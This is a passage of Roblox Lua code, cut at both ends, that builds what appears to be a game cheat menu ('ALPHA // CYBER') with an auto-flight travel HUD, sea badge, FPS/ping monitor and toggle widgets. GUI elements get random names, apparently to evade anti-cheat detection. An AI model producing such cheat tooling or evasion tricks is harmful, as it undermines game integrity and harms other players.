    TravelDist.ZIndex = 61
    TravelDist.Parent = TravelFrame
    
    local TravelProgressBar = Instance.new("Frame")
    TravelProgressBar.Size = UDim2.new(1, -110, 0, 4)
    TravelProgressBar.Position = UDim2.new(0, 14, 0, 44)
    TravelProgressBar.BackgroundColor3 = Color3.fromRGB(24, 24, 30)
    TravelProgressBar.BorderSizePixel = 0
    TravelProgressBar.ZIndex = 61
    TravelProgressBar.Parent = TravelFrame
    local TPBCorner = Instance.new("UICorner")
    TPBCorner.CornerRadius = UDim.new(1, 0)
    TPBCorner.Parent = TravelProgressBar
    
    local TravelProgressFill = Instance.new("Frame")
    TravelProgressFill.Size = UDim2.new(0, 0, 1, 0)
    TravelProgressFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TravelProgressFill.BorderSizePixel = 0
    TravelProgressFill.ZIndex = 62
    TravelProgressFill.Parent = TravelProgressBar
    local TPBFCorner = Instance.new("UICorner")
    TPBFCorner.CornerRadius = UDim.new(1, 0)
    TPBFCorner.Parent = TravelProgressFill
    
    local CancelFlightBtn = Instance.new("TextButton")
    CancelFlightBtn.Size = UDim2.new(0, 76, 0, 32)
    CancelFlightBtn.Position = UDim2.new(1, -86, 0.5, -16)
    CancelFlightBtn.Text = "CANCEL"
    CancelFlightBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    CancelFlightBtn.Font = Enum.Font.GothamBold
    CancelFlightBtn.TextSize = 10
    CancelFlightBtn.BackgroundColor3 = Color3.fromRGB(200, 30, 60)
    CancelFlightBtn.BorderSizePixel = 0
    CancelFlightBtn.Active = true
    CancelFlightBtn.ZIndex = 62
    CancelFlightBtn.Parent = TravelFrame
    local CFCorner = Instance.new("UICorner")
    CFCorner.CornerRadius = UDim.new(0, 6)
    CFCorner.Parent = CancelFlightBtn
    
    CancelFlightBtn.MouseButton1Click:Connect(function()
        PlayClickSound()
        StopTween()
    end)
    
    -- Draggable functionality for Travel HUD
    local travelDragging, travelDragInput, travelDragStart, travelStartPos
    local travelHasCustomPos = false
    TravelFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            travelDragging = true
            travelDragStart = input.Position
            travelStartPos = TravelFrame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    travelDragging = false
                end
            end)
        end
    end)
    TravelFrame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            travelDragInput = input
        end
    end)
    UIS.InputChanged:Connect(function(input)
        if input == travelDragInput and travelDragging then
            local delta = input.Position - travelDragStart
            travelHasCustomPos = true
            TravelFrame.Position = UDim2.new(travelStartPos.X.Scale, travelStartPos.X.Offset + delta.X, travelStartPos.Y.Scale, travelStartPos.Y.Offset + delta.Y)
        end
    end)

    local function GetDockedTravelPos()
        if MainFrame then
            local ox = MainFrame.Position.X.Offset + math.floor((MainFrame.Size.X.Offset - 370) / 2)
            local oy = MainFrame.Position.Y.Offset - 66
            return UDim2.new(MainFrame.Position.X.Scale, ox, MainFrame.Position.Y.Scale, oy)
        end
        return UDim2.new(0.5, -185, 0.5, -256)
    end
    
    local isTravelHUDActive = false
    SetTravelHUD = function(visible, destName, curDist, spd, totalDist)
        if visible then
            TravelTitle.Text = "FLYING TO: " .. tostring(destName or "TARGET"):upper()
            TravelDist.Text = "Distance: " .. math.floor(curDist or 0) .. " studs • Speed: " .. math.floor(spd or 250) .. " studs/s"
            if totalDist and totalDist > 0 then
                local pct = math.clamp(1 - ((curDist or 0) / totalDist), 0, 1)
                TravelProgressFill.Size = UDim2.new(pct, 0, 1, 0)
            end
            if not isTravelHUDActive then
                isTravelHUDActive = true
                TravelFrame.Visible = true
                local targetPos = travelHasCustomPos and TravelFrame.Position or GetDockedTravelPos()
                if not travelHasCustomPos then
                    TravelFrame.Position = UDim2.new(targetPos.X.Scale, targetPos.X.Offset, targetPos.Y.Scale, targetPos.Y.Offset - 25)
                    TweenService:Create(TravelFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = targetPos}):Play()
                end
            end
        else
            if isTravelHUDActive then
                isTravelHUDActive = false
                TravelProgressFill.Size = UDim2.new(0, 0, 1, 0)
                if not travelHasCustomPos then
                    local hidePos = UDim2.new(TravelFrame.Position.X.Scale, TravelFrame.Position.X.Offset, TravelFrame.Position.Y.Scale, TravelFrame.Position.Y.Offset - 30)
                    local tw = TweenService:Create(TravelFrame, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Position = hidePos})
                    tw:Play()
                    tw.Completed:Connect(function()
                        if not isTravelHUDActive then TravelFrame.Visible = false end
                    end)
                else
                    TravelFrame.Visible = false
                end
            end
        end
    end
    
    -- -------------------------------------------------------------
    -- 3D DEEP SHADOW LAYER
    -- -------------------------------------------------------------
    local ShadowFrame = Instance.new("Frame")
    ShadowFrame.Name = RNG()
    ShadowFrame.Size = UDim2.new(0, 614, 0, 394)
    ShadowFrame.Position = UDim2.new(0.5, -297, 0.5, -182)
    ShadowFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    ShadowFrame.BackgroundTransparency = 0.25
    ShadowFrame.BorderSizePixel = 0
    ShadowFrame.Parent = ScreenGui
    local ShadowCorner = Instance.new("UICorner")
    ShadowCorner.CornerRadius = UDim.new(0, 14)
    ShadowCorner.Parent = ShadowFrame
    
    -- -------------------------------------------------------------
    -- MAIN CONTAINER (Obsidian Black & Glowing White Aesthetic)
    -- -------------------------------------------------------------
    MainFrame = Instance.new("Frame")
    MainFrame.Name = RNG()
    MainFrame.Size = UDim2.new(0, 600, 0, 380)
    MainFrame.Position = UDim2.new(0.5, -300, 0.5, -190)
    MainFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 11)
    MainFrame.BorderSizePixel = 0
    MainFrame.ClipsDescendants = true
    MainFrame.Active = true
    MainFrame.Parent = ScreenGui
    
    -- Smooth 3D Entrance Bounce Animation on load
    MainFrame.Size = UDim2.new(0, 520, 0, 320)
    MainFrame.Position = UDim2.new(0.5, -260, 0.5, -160)
    TweenService:Create(MainFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Size = UDim2.new(0, 600, 0, 380),
        Position = UDim2.new(0.5, -300, 0.5, -190)
    }):Play()
    
    local function SyncShadow()
        ShadowFrame.Position = UDim2.new(MainFrame.Position.X.Scale, MainFrame.Position.X.Offset + 5, MainFrame.Position.Y.Scale, MainFrame.Position.Y.Offset + 6)
        ShadowFrame.Size = UDim2.new(0, MainFrame.AbsoluteSize.X + 10, 0, MainFrame.AbsoluteSize.Y + 10)
        ShadowFrame.Visible = MainFrame.Visible
    end
    MainFrame:GetPropertyChangedSignal("Position"):Connect(SyncShadow)
    MainFrame:GetPropertyChangedSignal("Visible"):Connect(SyncShadow)
    
    MainFrame.MouseEnter:Connect(function() _G.UIInteracting = false end)
    MainFrame.MouseLeave:Connect(function() _G.UIInteracting = false end)
    
    local MainCorner = Instance.new("UICorner")
    MainCorner.CornerRadius = UDim.new(0, 10)
    MainCorner.Parent = MainFrame
    
    local MainStroke = Instance.new("UIStroke")
    MainStroke.Color = Color3.fromRGB(255, 255, 255)
    MainStroke.Thickness = 1.8
    MainStroke.Transparency = 0.12
    MainStroke.Parent = MainFrame
    
    -- Dynamic rotating & breathing glowing white border effect
    local StrokeGrad = Instance.new("UIGradient")
    StrokeGrad.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(160, 165, 180)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
    }
    StrokeGrad.Parent = MainStroke
    
    task.spawn(function()
        local rot = 0
        local t = 0
        while MainStroke.Parent do
            rot = (rot + 3) % 360
            t = t + 0.05
            StrokeGrad.Rotation = rot
            MainStroke.Transparency = 0.1 + 0.15 * math.sin(t)
            task.wait(0.02)
        end
    end)
    
    -- Sleek Top Bevel Highlight Line
    local TopHighlight = Instance.new("Frame")
    TopHighlight.Size = UDim2.new(1, 0, 0, 1)
    TopHighlight.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TopHighlight.BackgroundTransparency = 0.65
    TopHighlight.BorderSizePixel = 0
    TopHighlight.ZIndex = 10
    TopHighlight.Parent = MainFrame
    
    -- Dragging logic
    local dragging, dragInput, dragStart, startPos
    MainFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = MainFrame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    MainFrame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    UIS.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
            if not travelHasCustomPos and TravelFrame and TravelFrame.Visible then
                TravelFrame.Position = GetDockedTravelPos()
            end
        end
    end)
    
    -- Top Bar with Obsidian Gradient
    local TopBar = Instance.new("Frame")
    TopBar.Name = RNG()
    TopBar.Size = UDim2.new(1, 0, 0, 44)
    TopBar.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
    TopBar.BorderSizePixel = 0
    TopBar.Active = true
    TopBar.Parent = MainFrame
    
    local TopBarGrad = Instance.new("UIGradient")
    TopBarGrad.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 20, 26)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 13))
    }
    TopBarGrad.Rotation = 90
    TopBarGrad.Parent = TopBar
    
    local TopStroke = Instance.new("UIStroke")
    TopStroke.Color = Color3.fromRGB(36, 36, 44)
    TopStroke.Thickness = 1
    TopStroke.Parent = TopBar
    
    -- Glowing White Logo Badge
    local LogoBadge = Instance.new("Frame")
    LogoBadge.Size = UDim2.new(0, 26, 0, 26)
    LogoBadge.Position = UDim2.new(0, 12, 0, 9)
    LogoBadge.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    LogoBadge.BorderSizePixel = 0
    LogoBadge.Parent = TopBar
    local LBCorner = Instance.new("UICorner")
    LBCorner.CornerRadius = UDim.new(0, 6)
    LBCorner.Parent = LogoBadge
    local LBLabel = Instance.new("TextLabel")
    LBLabel.Size = UDim2.new(1, 0, 1, 0)
    LBLabel.Text = "α"
    LBLabel.TextColor3 = Color3.fromRGB(10, 10, 12)
    LBLabel.Font = Enum.Font.GothamBold
    LBLabel.TextSize = 16
    LBLabel.BackgroundTransparency = 1
    LBLabel.Parent = LogoBadge
    
    local TitleLabel = Instance.new("TextLabel")
    TitleLabel.Size = UDim2.new(0, 165, 1, 0)
    TitleLabel.Position = UDim2.new(0, 46, 0, 0)
    TitleLabel.Text = "ALPHA // CYBER v" .. SCRIPT_VERSION
    TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    TitleLabel.Font = Enum.Font.GothamBold
    TitleLabel.TextSize = 13
    TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
    TitleLabel.BackgroundTransparency = 1
    TitleLabel.Active = true
    TitleLabel.Parent = TopBar
    
    -- Status Pill Badges (Clean Typography - No Emojis)
    local SeaBadge = Instance.new("Frame")
    SeaBadge.Size = UDim2.new(0, 95, 0, 22)
    SeaBadge.Position = UDim2.new(0, 218, 0, 11)
    SeaBadge.BackgroundColor3 = Color3.fromRGB(16, 16, 20)
    SeaBadge.BorderSizePixel = 0
    SeaBadge.Parent = TopBar
    local SBCorner = Instance.new("UICorner")
    SBCorner.CornerRadius = UDim.new(1, 0)
    SBCorner.Parent = SeaBadge
    local SBStroke = Instance.new("UIStroke")
    SBStroke.Color = Color3.fromRGB(255, 255, 255)
    SBStroke.Thickness = 1
    SBStroke.Transparency = 0.5
    SBStroke.Parent = SeaBadge
    local SBLabel = Instance.new("TextLabel")
    SBLabel.Size = UDim2.new(1, 0, 1, 0)
    SBLabel.Text = SeaName
    SBLabel.TextColor3 = Color3.fromRGB(240, 240, 250)
    SBLabel.Font = Enum.Font.GothamBold
    SBLabel.TextSize = 10
    SBLabel.BackgroundTransparency = 1
    SBLabel.Parent = SeaBadge
    
    -- Live Performance Monitor Badge (Clean Typography - No Emojis)
    local PerfBadge = Instance.new("Frame")
    PerfBadge.Size = UDim2.new(0, 138, 0, 22)
    PerfBadge.Position = UDim2.new(0, 320, 0, 11)
    PerfBadge.BackgroundColor3 = Color3.fromRGB(16, 16, 20)
    PerfBadge.BorderSizePixel = 0
    PerfBadge.Parent = TopBar
    local PBCorner = Instance.new("UICorner")
    PBCorner.CornerRadius = UDim.new(1, 0)
    PBCorner.Parent = PerfBadge
    local PBStroke = Instance.new("UIStroke")
    PBStroke.Color = Color3.fromRGB(255, 255, 255)
    PBStroke.Thickness = 1
    PBStroke.Transparency = 0.5
    PBStroke.Parent = PerfBadge
    local PBLabel = Instance.new("TextLabel")
    PBLabel.Size = UDim2.new(1, 0, 1, 0)
    PBLabel.Text = "60 FPS | 40ms"
    PBLabel.TextColor3 = Color3.fromRGB(240, 240, 250)
    PBLabel.Font = Enum.Font.GothamBold
    PBLabel.TextSize = 10
    PBLabel.BackgroundTransparency = 1
    PBLabel.Parent = PerfBadge
    
    task.spawn(function()
        local lastTime = tick()
        local frameCount = 0
        local currentFPS = 60
        
        RunService.RenderStepped:Connect(function()
            frameCount = frameCount + 1
            local now = tick()
            if (now - lastTime) >= 0.5 then
                currentFPS = math.floor(frameCount / (now - lastTime))
                frameCount = 0
                lastTime = now
                
                local ping = 45
                pcall(function()
                    local statsService = game:GetService("Stats")
                    local netStats = statsService.Network.ServerStatsItem
                    if netStats and netStats["Data Ping"] then
                        ping = math.floor(netStats["Data Ping"]:GetValue())
                    elseif LocalPlayer.GetNetworkPing then
                        ping = math.floor(LocalPlayer:GetNetworkPing() * 1000)
                    end
                end)
                
                local col = Color3.fromRGB(240, 240, 250)
                if currentFPS < 30 or ping > 180 then
                    col = Color3.fromRGB(255, 75, 95)
                elseif currentFPS < 45 or ping > 110 then
                    col = Color3.fromRGB(255, 200, 50)
                end
                
                PBLabel.Text = string.format("%d FPS | %dms", currentFPS, ping)
                PBLabel.TextColor3 = col
                PBStroke.Color = col
            end
        end)
    end)
    
    local CloseBtn = Instance.new("TextButton")
    CloseBtn.Size = UDim2.new(0, 28, 0, 28)
    CloseBtn.Position = UDim2.new(1, -36, 0, 8)
    CloseBtn.Text = "✕"
    CloseBtn.TextColor3 = Color3.fromRGB(220, 220, 220)
    CloseBtn.Font = Enum.Font.GothamBold
    CloseBtn.TextSize = 12
    CloseBtn.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
    CloseBtn.BorderSizePixel = 0
    CloseBtn.Active = true
    CloseBtn.Parent = TopBar
    local CloseCorner = Instance.new("UICorner")
    CloseCorner.CornerRadius = UDim.new(0, 6)
    CloseCorner.Parent = CloseBtn
    
    CloseBtn.MouseEnter:Connect(function()
        TweenService:Create(CloseBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(225, 35, 70)}):Play()
    end)
    CloseBtn.MouseLeave:Connect(function()
        TweenService:Create(CloseBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(24, 24, 28)}):Play()
    end)
    CloseBtn.MouseButton1Click:Connect(function()
        PlayClickSound()
        TweenService:Create(MainFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {
            Size = UDim2.new(0, 520, 0, 320),
            Position = UDim2.new(0.5, -260, 0.5, -160)
        }):Play()
        task.wait(0.25)
        MainFrame.Visible = false
    end)
    
    -- Floating Draggable Cyber Orb Button (Glowing White Breathing Border)
    local FloatingBtn = Instance.new("TextButton")
    FloatingBtn.Name = RNG()
    FloatingBtn.Size = UDim2.new(0, 52, 0, 52)
    FloatingBtn.Position = UDim2.new(0, 20, 0.5, -26)
    FloatingBtn.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
    FloatingBtn.Text = "ALPHA"
    FloatingBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    FloatingBtn.Font = Enum.Font.GothamBold
    FloatingBtn.TextSize = 11
    FloatingBtn.BorderSizePixel = 0
    FloatingBtn.Active = true
    FloatingBtn.Parent = ScreenGui
    local FloatCorner = Instance.new("UICorner")
    FloatCorner.CornerRadius = UDim.new(1, 0)
    FloatCorner.Parent = FloatingBtn
    local FloatStroke = Instance.new("UIStroke")
    FloatStroke.Color = Color3.fromRGB(255, 255, 255)
    FloatStroke.Thickness = 2
    FloatStroke.Parent = FloatingBtn
    
    task.spawn(function()
        while FloatStroke.Parent do
            TweenService:Create(FloatStroke, TweenInfo.new(1.0, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.65}):Play()
            task.wait(1.0)
            TweenService:Create(FloatStroke, TweenInfo.new(1.0, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.05}):Play()
            task.wait(1.0)
        end
    end)
    
    local fDragging, fDragInput, fDragStart, fStartPos
    FloatingBtn.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            fDragging = true
            fDragStart = input.Position
            fStartPos = FloatingBtn.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then fDragging = false end
            end)
        end
    end)
    FloatingBtn.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            fDragInput = input
        end
    end)
    UIS.InputChanged:Connect(function(input)
        if input == fDragInput and fDragging then
            local delta = input.Position - fDragStart
            FloatingBtn.Position = UDim2.new(fStartPos.X.Scale, fStartPos.X.Offset + delta.X, fStartPos.Y.Scale, fStartPos.Y.Offset + delta.Y)
        end
    end)
    FloatingBtn.MouseButton1Click:Connect(function()
        PlayClickSound()
        if not MainFrame.Visible then
            MainFrame.Visible = true
            MainFrame.Size = UDim2.new(0, 520, 0, 320)
            MainFrame.Position = UDim2.new(0.5, -260, 0.5, -160)
            TweenService:Create(MainFrame, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
                Size = UDim2.new(0, 600, 0, 380),
                Position = UDim2.new(0.5, -300, 0.5, -190)
            }):Play()
        else
            MainFrame.Visible = false
        end
    end)
    
    -- Left Sidebar (Deep Obsidian)
    local Sidebar = Instance.new("ScrollingFrame")
    Sidebar.Name = RNG()
    Sidebar.Size = UDim2.new(0, 145, 1, -44)
    Sidebar.Position = UDim2.new(0, 0, 0, 44)
    Sidebar.BackgroundColor3 = Color3.fromRGB(10, 10, 13)
    Sidebar.BorderSizePixel = 0
    Sidebar.ScrollBarThickness = 2
    Sidebar.CanvasSize = UDim2.new(0, 0, 0, 440)
    Sidebar.Active = true
    Sidebar.Parent = MainFrame
    
    local SidebarLayout = Instance.new("UIListLayout")
    SidebarLayout.Padding = UDim.new(0, 4)
    SidebarLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    SidebarLayout.SortOrder = Enum.SortOrder.LayoutOrder
    SidebarLayout.Parent = Sidebar
    local SidebarPad = Instance.new("UIPadding")
    SidebarPad.PaddingTop = UDim.new(0, 6)
    SidebarPad.Parent = Sidebar
    
    -- Content Container (Deep Obsidian)
    local ContentHolder = Instance.new("Frame")
    ContentHolder.Name = RNG()
    ContentHolder.Size = UDim2.new(1, -145, 1, -44)
    ContentHolder.Position = UDim2.new(0, 145, 0, 44)
    ContentHolder.BackgroundColor3 = Color3.fromRGB(8, 8, 11)
    ContentHolder.BorderSizePixel = 0
    ContentHolder.Active = true
    ContentHolder.Parent = MainFrame
    
    local Tabs = {}
    local CurrentActiveTab = nil
    
    -- Sliding Tab Indicator (Radiant Glowing White)
    local TabIndicator = Instance.new("Frame")
    TabIndicator.Name = "ActiveTabIndicator"
    TabIndicator.Size = UDim2.new(0, 4, 0, 24)
    TabIndicator.Position = UDim2.new(0, 2, 0, 8)
    TabIndicator.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TabIndicator.BorderSizePixel = 0
    TabIndicator.ZIndex = 5
    TabIndicator.Parent = Sidebar
    local TICorner = Instance.new("UICorner")
    TICorner.CornerRadius = UDim.new(1, 0)
    TICorner.Parent = TabIndicator
    
    local function SwitchTab(tabName)
        PlayClickSound()
        for name, page in pairs(Tabs) do
            if name == tabName then
                page.Page.Position = UDim2.new(0, 0, 0, 8)
                page.Page.Visible = true
                TweenService:Create(page.Page, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2.new(0, 0, 0, 0)}):Play()
                if page.Btn then
                    TweenService:Create(page.Btn, TweenInfo.new(0.18), {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(10, 10, 12)}):Play()
                    TweenService:Create(TabIndicator, TweenInfo.new(0.22, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
                        Position = UDim2.new(0, 2, 0, page.Btn.Position.Y.Offset + 2)
                    }):Play()
                end
            else
                page.Page.Visible = false
                if page.Btn then
                    TweenService:Create(page.Btn, TweenInfo.new(0.18), {BackgroundColor3 = Color3.fromRGB(16, 16, 20), TextColor3 = Color3.fromRGB(160, 160, 175)}):Play()
                end
            end
        end
        CurrentActiveTab = tabName
    end
    
    local function CreateTab(name)
        local TabBtn = Instance.new("TextButton")
        TabBtn.Size = UDim2.new(1, -12, 0, 28)
        TabBtn.Text = name
        TabBtn.TextColor3 = Color3.fromRGB(160, 160, 175)
        TabBtn.Font = Enum.Font.GothamMedium
        TabBtn.TextSize = 11
        TabBtn.BackgroundColor3 = Color3.fromRGB(16, 16, 20)
        TabBtn.BorderSizePixel = 0
        TabBtn.Active = true
        TabBtn.Parent = Sidebar
        local TabBtnCorner = Instance.new("UICorner")
        TabBtnCorner.CornerRadius = UDim.new(0, 5)
        TabBtnCorner.Parent = TabBtn
        
        TabBtn.MouseEnter:Connect(function()
            if CurrentActiveTab ~= name then
                TweenService:Create(TabBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(26, 26, 32), TextColor3 = Color3.fromRGB(240, 240, 250)}):Play()
            end
        end)
        TabBtn.MouseLeave:Connect(function()
            if CurrentActiveTab ~= name then
                TweenService:Create(TabBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(16, 16, 20), TextColor3 = Color3.fromRGB(160, 160, 175)}):Play()
            end
        end)
        
        local Page = Instance.new("ScrollingFrame")
        Page.Name = RNG()
        Page.Size = UDim2.new(1, 0, 1, 0)
        Page.BackgroundTransparency = 1
        Page.BorderSizePixel = 0
        Page.ScrollBarThickness = 3
        Page.CanvasSize = UDim2.new(0, 0, 0, 100)
        Page.Visible = false
        Page.Active = true
        Page.Parent = ContentHolder
        
        local PageLayout = Instance.new("UIListLayout")
        PageLayout.Padding = UDim.new(0, 6)
        PageLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
        PageLayout.SortOrder = Enum.SortOrder.LayoutOrder
        PageLayout.Parent = Page
        local PagePad = Instance.new("UIPadding")
        PagePad.PaddingTop = UDim.new(0, 8)
        PagePad.PaddingBottom = UDim.new(0, 16)
        PagePad.Parent = Page
        
        PageLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
            Page.CanvasSize = UDim2.new(0, 0, 0, PageLayout.AbsoluteContentSize.Y + 28)
        end)
        
        TabBtn.MouseButton1Click:Connect(function()
            SwitchTab(name)
        end)
        
        Tabs[name] = {Btn = TabBtn, Page = Page}
        
        local TabAPI = {}
        
        function TabAPI:AddSection(secName)
            local SecFrame = Instance.new("Frame")
            SecFrame.Size = UDim2.new(1, -16, 0, 24)
            SecFrame.BackgroundTransparency = 1
            SecFrame.Active = true
            SecFrame.Parent = Page
            
            local SecLabel = Instance.new("TextLabel")
            SecLabel.Size = UDim2.new(1, 0, 1, 0)
            SecLabel.Text = "• " .. secName:upper()
            SecLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            SecLabel.Font = Enum.Font.GothamBold
            SecLabel.TextSize = 10
            SecLabel.TextXAlignment = Enum.TextXAlignment.Left
            SecLabel.BackgroundTransparency = 1
            SecLabel.Active = true
            SecLabel.Parent = SecFrame
        end
        
        function TabAPI:AddNotice(text, color)
            local NFrame = Instance.new("Frame")
            NFrame.Size = UDim2.new(1, -16, 0, 32)
            NFrame.BackgroundColor3 = Color3.fromRGB(16, 16, 20)
            NFrame.BorderSizePixel = 0
            NFrame.Parent = Page
            local NCorner = Instance.new("UICorner")
            NCorner.CornerRadius = UDim.new(0, 6)
            NCorner.Parent = NFrame
            local NStroke = Instance.new("UIStroke")
            NStroke.Color = color or Color3.fromRGB(255, 255, 255)
            NStroke.Thickness = 1
            NStroke.Transparency = 0.5
            NStroke.Parent = NFrame
            
            local NText = Instance.new("TextLabel")
            NText.Size = UDim2.new(1, -16, 1, 0)
            NText.Position = UDim2.new(0, 8, 0, 0)
            NText.Text = text
            NText.TextColor3 = color or Color3.fromRGB(235, 235, 245)
            NText.Font = Enum.Font.GothamMedium
            NText.TextSize = 10
            NText.TextXAlignment = Enum.TextXAlignment.Left
            NText.BackgroundTransparency = 1
            NText.Parent = NFrame
        end
        
        function TabAPI:AddToggle(title, defaultVal, callback)
            local isChecked = defaultVal or false
            local ToggleFrame = Instance.new("Frame")
            ToggleFrame.Size = UDim2.new(1, -16, 0, 34)
            ToggleFrame.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
            ToggleFrame.BorderSizePixel = 0
            ToggleFrame.Active = true
            ToggleFrame.Parent = Page
            local TCorner = Instance.new("UICorner")
            TCorner.CornerRadius = UDim.new(0, 6)
            TCorner.Parent = ToggleFrame
            
            local TStroke = Instance.new("UIStroke")
            TStroke.Color = Color3.fromRGB(28, 28, 36)
            TStroke.Thickness = 1
            TStroke.Parent = ToggleFrame
            
            ToggleFrame.MouseEnter:Connect(function()
                TweenService:Create(TStroke, TweenInfo.new(0.15), {Color = Color3.fromRGB(55, 55, 70)}):Play()
            end)
            ToggleFrame.MouseLeave:Connect(function()
                TweenService:Create(TStroke, TweenInfo.new(0.15), {Color = Color3.fromRGB(28, 28, 36)}):Play()
            end)
            
            local TTitle = Instance.new("TextLabel")
            TTitle.Size = UDim2.new(1, -55, 1, 0)
            TTitle.Position = UDim2.new(0, 10, 0, 0)
            TTitle.Text = title
            TTitle.TextColor3 = Color3.fromRGB(230, 230, 240)
            TTitle.Font = Enum.Font.Gotham
            TTitle.TextSize = 11
            TTitle.TextXAlignment = Enum.TextXAlignment.Left
            TTitle.BackgroundTransparency = 1
            TTitle.Active = true
            TTitle.Parent = ToggleFrame
            
            local Switch = Instance.new("TextButton")
            Switch.Size = UDim2.new(0, 38, 0, 20)
            Switch.Position = UDim2.new(1, -48, 0.5, -10)
            Switch.BackgroundColor3 = isChecked and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(28, 28, 36)
            Switch.Text = ""
            Switch.BorderSizePixel = 0
            Switch.Active = true
            Switch.Parent = ToggleFrame
            local SCorner = Instance.new("UICorner")
            SCorner.CornerRadius = UDim.new(1, 0)
            SCorner.Parent = Switch
            
            local Knob = Instance.new("Frame")
            Knob.Size = UDim2.new(0, 16, 0, 16)
            Knob.Position = isChecked and UDim2.new(1, -18, 0.5, -8) or UDim2.new(0, 2, 0.5, -8)
            Knob.BackgroundColor3 = isChecked and Color3.fromRGB(10, 10, 12) or Color3.fromRGB(220, 220, 230)
            Knob.BorderSizePixel = 0
            Knob.Active = true
            Knob.Parent = Switch
            local KCorner = Instance.new("UICorner")
            KCorner.CornerRadius = UDim.new(1, 0)
            KCorner.Parent = Knob
            
            local function UpdateToggle()
                local targetBg = isChecked and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(28, 28, 36)
                local targetKnobColor = isChecked and Color3.fromRGB(10, 10, 12) or Color3.fromRGB(220, 220, 230)
                local targetPos = isChecked and UDim2.new(1, -18, 0.5, -8) or UDim2.new(0, 2, 0.5, -8)
                TweenService:Create(Switch, TweenInfo.new(0.2, Enum.EasingStyle.Quart), {BackgroundColor3 = targetBg}):Play()
                TweenService:Create(Knob, TweenInfo.new(0.2, Enum.EasingStyle.Quart), {Position = targetPos, BackgroundColor3 = targetKnobColor}):Play()
            end
            
            Switch.MouseButton1Click:Connect(function()
                PlayClickSound()
                isChecked = not isChecked
                UpdateToggle()
                if callback then pcall(callback, isChecked) end
            end)
            
            local ToggleAPI = {}
            function ToggleAPI:Set(val)
                isChecked = val
                UpdateToggle()
                if callback then pcall(callback, isChecked) end
            end
            return ToggleAPI
        end
        
        function TabAPI:AddButton(title, callback)
            local Btn = Instance.new("TextButton")
            Btn.Size = UDim2.new(1, -16, 0, 30)
            Btn.BackgroundColor3 = Color3.fromRGB(16, 16, 22)
            Btn.Text = title
            Btn.TextColor3 = Color3.fromRGB(240, 240, 245)
            Btn.Font = Enum.Font.GothamMedium
            Btn.TextSize = 11
            Btn.BorderSizePixel = 0
            Btn.Active = true
            Btn.Parent = Page
            local BCorner = Instance.new("UICorner")
            BCorner.CornerRadius = UDim.new(0, 5)
            BCorner.Parent = Btn
            local BStroke = Instance.new("UIStroke")
            BStroke.Color = Color3.fromRGB(36, 36, 46)
            BStroke.Thickness = 1
            BStroke.Parent = Btn
            
            Btn.MouseEnter:Connect(function()
